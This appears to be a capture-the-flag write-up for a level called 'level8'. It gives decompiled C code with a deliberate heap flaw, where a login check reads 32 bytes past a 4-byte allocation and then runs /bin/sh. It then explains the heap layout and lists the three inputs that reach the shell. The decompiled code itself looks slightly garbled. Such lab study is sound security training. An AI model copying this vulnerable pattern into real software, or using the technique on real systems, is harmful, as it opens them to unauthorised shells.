# Level8

## Code

```
#include <stdio.h>
#include <stdlib.h>

char *auth;
char *service;

int main(void)
{
  char str[128];

  while ( 1 )
  {
    printf("%p, %p \n", auth, service);
    if ( !fgets(str, 128, stdin) )
      break;
    if ( !memcmp(str, "auth ", 5) )
    {
     auth = (char *)malloc(4);
     *auth = 0;
      if ( strlen(&auth[5]) <= 30 )
        strcpy(auth, &auth[5]);
    }
    if ( !memcmp(str, "reset", 5) )
      free(auth);
    if ( !memcmp(str, "service", 6) )
     service = strdup(&str[7]);
    if ( !memcmp(str, "login", 5) )
    {
     if ( *(auth + 32) )
       system("/bin/sh");
     else
       fwrite("Password:\n", 1, 10, stdout);
    }
  }
  return (0);
}
```

## Explanation

- To be completely honest we found the answer to this level by chance just by playing with the program and providing this input :\
    - 1st input: "auth "\
    - 2nd input: "serviceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"\
    - 3rd input: "login"\

- When looking at the code, we could see that the first call to malloc() was given 4 as argument, 
    allocating 4 bytes only.

- Also, we noticed the condition to win was to give the program "login" as input while having a non
    null dword (4 bytes) at the address of the first malloc + 32 bytes

- Since strdup() makes another call to malloc when we give the program "service" as input, this second
    malloc gives us a new chunk of memory that is of course after the 4 bytes allocated by the first
    malloc, actually 16 bytes after, judging by the printed values.

- We don't need to write a specific value at first malloc + 32 bytes, we just need this spot to be non
    null, that's why it worked with all the "e" in the above example, it could have been anything
    else.

## Exploit

```
$   ./level8
        1st input: "auth "
        2nd input: "serviceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
        3rd input: "login"
```